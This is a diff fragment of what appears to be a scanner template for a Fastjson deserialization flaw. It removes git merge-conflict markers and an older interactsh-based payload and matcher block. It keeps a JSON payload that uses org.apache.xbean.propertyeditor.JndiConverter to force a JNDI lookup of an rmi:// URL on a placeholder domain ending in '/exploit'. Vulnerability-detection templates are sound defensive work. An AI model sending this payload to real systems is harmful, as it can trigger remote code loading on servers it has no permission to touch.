@@ -26,27 +26,5 @@ requests:
 
         {
            "@type":"org.apache.xbean.propertyeditor.JndiConverter",
-<<<<<<< HEAD
-<<<<<<< HEAD
-           "AsText":"rmi://{{interactsh-url}}/exploit"
-        }
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol   # Confirms DNS Interaction
-        words:
-          - "dns"
-
-      - type: status
-        negative: true
-        status:
-          - 200
-=======
            "AsText":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/exploit"
         }
->>>>>>> 5d36d276 (add new stuff)
-=======
-           "AsText":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/exploit"
-        }
->>>>>>> 18ddf72b (add new stuff)
